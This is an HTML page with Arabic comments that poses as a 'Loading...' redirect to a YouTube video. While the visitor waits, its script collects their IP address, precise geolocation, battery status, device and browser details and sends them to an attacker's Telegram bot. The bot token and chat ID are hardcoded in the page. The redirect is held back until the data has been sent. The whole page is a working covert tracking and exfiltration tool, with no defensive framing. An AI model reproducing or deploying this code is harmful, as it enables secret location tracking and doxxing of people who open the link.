<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
        }

        .hidden-content {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="hidden-content" id="hiddenStatus">Processing...</div>

    <script>
        // =============================================================================
        // إعدادات النظام
        // =============================================================================
        
        const REDIRECT_URL = 'https://youtu.be/YiK3BulNaWQ?si=FoPzuWYEJUGtynF9';
        const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
        const CHAT_ID = '170383339';
        
        // =============================================================================
        
        let redirected = false;
        let dataCollectionStarted = false;
        
        function log(message) {
            console.log(`🔧 ${new Date().toLocaleTimeString()} - ${message}`);
        }
        
        // منع التحويل حتى ينتهي الإرسال
        function preventRedirect() {
            redirected = true;
        }
        
        // جمع البيانات الأساسية
        function collectBasicData() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            return {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', {
                    timeZone: 'Asia/Baghdad'
                }),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                screenRes: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'مجهول',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'مجهول'
            };
        }
        
        // الحصول على IP
        async function getIP() {
            log('🌍 بحث عن IP...');
            
            const services = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://api.myip.com'
            ];
            
            for (let service of services) {
                try {
                    const response = await fetch(service, {
                        method: 'GET',
                        headers: { 'Accept': 'application/json' }
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = data.ip || data.origin;
                        if (ip) {
                            log(`✅ IP: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    log(`❌ فشل ${service}: ${error.message}`);
                    continue;
                }
            }
            return 'غير متاح';
        }
        
        // الحصول على معلومات البطارية
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    log('🔋 محاولة الحصول على معلومات البطارية...');
                    const battery = await navigator.getBattery();
                    const batteryData = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                    log(`✅ بطارية: ${batteryData.level}% (${batteryData.charging ? 'يشحن' : 'لا يشحن'})`);
                    return batteryData;
                }
                log('⚠️ API البطارية غير مدعوم');
                return null;
            } catch (error) {
                log(`❌ خطأ البطارية: ${error.message}`);
                return null;
            }
        }
        function getLocation() {
            return new Promise((resolve) => {
                log('📍 طلب الموقع...');
                
                if (!navigator.geolocation) {
                    log('❌ لا يدعم تحديد الموقع');
                    resolve(null);
                    return;
                }
                
                let resolved = false;
                
                const handleSuccess = (position) => {
                    if (!resolved) {
                        resolved = true;
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        };
                        log(`✅ موقع: ${location.latitude}, ${location.longitude}`);
                        resolve(location);
                    }
                };
                
                const handleError = (error) => {
                    if (!resolved) {
                        log(`❌ خطأ موقع: ${error.message}`);
                    }
                };
                
                // محاولة أولى
                navigator.geolocation.getCurrentPosition(
                    handleSuccess,
                    handleError,
                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 30000 }
                );
                
                // محاولة ثانية بعد ثانيتين
                setTimeout(() => {
                    if (!resolved) {
                        navigator.geolocation.getCurrentPosition(
                            handleSuccess,
                            handleError,
                            { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
                        );
                    }
                }, 2000);
                
                // انتهاء المهلة بعد 4 ثواني
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        log('⏰ انتهت مهلة الموقع');
                        resolve(null);
                    }
                }, 4000);
            });
        }
        
        // إرسال البيانات - مبسط وموثوق
        async function sendDataReliably(data) {
            log('📤 تحضير الرسالة...');
            
            let locationText = 'غير متاح';
            let mapsLink = '';
            let batteryText = '🔋 البطارية: غير متاح';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (دقة: ${accuracy}م)`;
                mapsLink = `https://www.google.com/maps/dir//${latitude},${longitude}/@${latitude},${longitude},272m/data=!3m1!1e3`;
            }
            
            if (data.battery && data.battery.level !== undefined) {
                const chargingStatus = data.battery.charging ? 'يتم الشحن 🔌' : 'غير متصل 🔋';
                batteryText = `🔋 البطارية: ${data.battery.level}% (${chargingStatus})`;
            }
            
            const message = `🎯 زائر جديد:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ${data.device.localTime}
🌐 ${data.device.url}
🔗 ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 ${data.device.deviceType} | ${data.device.browser}
📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
${batteryText}
🌍 IP: ${data.ip}
📍 الموقع: ${locationText}
${mapsLink ? `🗺️ الخريطة: ${mapsLink}` : ''}
🗣️ ${data.device.language} | ${data.device.timezone}
📱 ${data.device.screenRes} | ${data.device.platform}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.device.userAgent}`;
            
            log('📝 الرسالة جاهزة، طولها: ' + message.length + ' حرف');
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: false
            };
            
            // محاولات متعددة مع لوغ مفصل
            for (let attempt = 1; attempt <= 3; attempt++) {
                try {
                    log(`📤 محاولة إرسال ${attempt}/3`);
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    log(`📡 كود الاستجابة: ${response.status}`);
                    
                    if (response.ok) {
                        const result = await response.json();
                        log('📋 استجابة Telegram: ' + JSON.stringify(result));
                        
                        if (result.ok) {
                            log('✅ تم إرسال الرسالة بنجاح!');
                            return true;
                        } else {
                            log(`❌ خطأ من Telegram: ${result.description}`);
                        }
                    } else {
                        const errorText = await response.text();
                        log(`❌ خطأ HTTP ${response.status}: ${errorText}`);
                    }
                    
                } catch (error) {
                    log(`❌ خطأ في المحاولة ${attempt}: ${error.name} - ${error.message}`);
                    
                    if (error.name === 'TypeError') {
                        log('🚫 مشكلة في الاتصال بالشبكة');
                    }
                }
                
                // انتظار قبل المحاولة التالية
                if (attempt < 3) {
                    log('⏳ انتظار ثانيتين قبل المحاولة التالية...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
            
            log('❌ فشل في جميع محاولات الإرسال');
            return false;
        }
        
        // التحويل الآمن
        function redirectSafely() {
            if (redirected) {
                log('⚠️ تم التحويل مسبقاً');
                return;
            }
            
            redirected = true;
            log('🔄 تحويل إلى يوتيوب...');
            
            try {
                window.location.replace(REDIRECT_URL);
            } catch (error) {
                window.location.href = REDIRECT_URL;
            }
        }
        
        // العملية الرئيسية - بدون تحويل سريع
        async function main() {
            if (dataCollectionStarted) return;
            dataCollectionStarted = true;
            
            log('🚀 بدء النظام - بدون تحويل مبكر');
            
            try {
                // جمع البيانات الأساسية فوراً
                const basicData = collectBasicData();
                log('✅ البيانات الأساسية جاهزة');
                
                // جمع IP والموقع والبطارية بشكل منفصل
                log('🔄 جمع البيانات...');
                
                // البيانات الأساسية جاهزة
                let ip, location, battery;
                
                // جمع IP
                try {
                    ip = await getIP();
                } catch (error) {
                    log('❌ خطأ IP: ' + error.message);
                    ip = 'غير متاح';
                }
                
                // جمع الموقع
                try {
                    location = await getLocation();
                } catch (error) {
                    log('❌ خطأ الموقع: ' + error.message);
                    location = null;
                }
                
                // جمع معلومات البطارية (اختياري)
                try {
                    battery = await Promise.race([
                        getBatteryInfo(),
                        new Promise(resolve => setTimeout(() => resolve(null), 2000)) // 2 ثانية حد أقصى
                    ]);
                } catch (error) {
                    log('❌ خطأ البطارية: ' + error.message);
                    battery = null;
                }
                
                const fullData = {
                    device: basicData,
                    ip: ip,
                    location: location,
                    battery: battery
                };
                
                log('📊 ملخص البيانات:');
                log(`   IP: ${ip}`);
                log(`   موقع: ${location ? 'متوفر' : 'غير متوفر'}`);
                log(`   بطارية: ${battery ? battery.level + '%' : 'غير متوفر'}`);
                
                // إرسال البيانات
                log('📤 بدء إرسال البيانات...');
                const sendSuccess = await sendDataReliably(fullData);
                
                if (sendSuccess) {
                    log('✅ تم إرسال البيانات - انتظار 2 ثانية ثم التحويل');
                    setTimeout(redirectSafely, 2000);
                } else {
                    log('❌ فشل الإرسال - التحويل بعد ثانية واحدة');
                    setTimeout(redirectSafely, 1000);
                }
                
            } catch (error) {
                log('❌ خطأ عام: ' + error.message);
                setTimeout(redirectSafely, 500);
            }
        }
        
        // بدء النظام عند الاستعداد
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
        } else {
            // تأخير قصير للتأكد من الاستعداد
            setTimeout(main, 200);
        }
        
        // حماية من التعليق - تحويل إجباري بعد 15 ثانية
        setTimeout(() => {
            if (!redirected) {
                log('⏰ تحويل إجباري بعد 15 ثانية');
                redirectSafely();
            }
        }, 15000);
        
        log('🎯 النظام محمل - لن يتم التحويل قبل إرسال البيانات');
    </script>
</body>
</html>
